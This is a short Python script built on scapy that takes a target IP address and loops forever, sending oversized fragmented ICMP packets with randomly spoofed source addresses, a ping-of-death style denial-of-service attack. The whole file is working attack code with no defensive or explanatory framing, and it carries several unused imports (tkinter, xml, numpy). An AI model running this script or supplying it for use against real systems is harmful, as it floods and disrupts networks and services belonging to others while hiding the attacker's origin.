import sys
from tkinter import Frame
from xml.dom.expatbuilder import FragmentBuilder
from numpy import true_divide
from scapy.all import*
if len(sys.argv) < 2:
    print(sys.argv[0] + " <target_ip>")
    sys.exit(0)
def PodAttack(target_ip):
    s_addr = RandIP()
    print(s_addr, "=>", target_ip)
    pkt = IP(src = s_addr, dst = target_ip)/ICMP()/("Pod"*15000)
    send(fragment(pkt))


while True:
    PodAttack(sys.argv[1])
